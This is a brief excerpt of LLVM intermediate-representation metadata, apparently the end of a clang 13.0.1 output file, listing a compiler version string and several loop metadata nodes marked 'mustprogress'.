!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
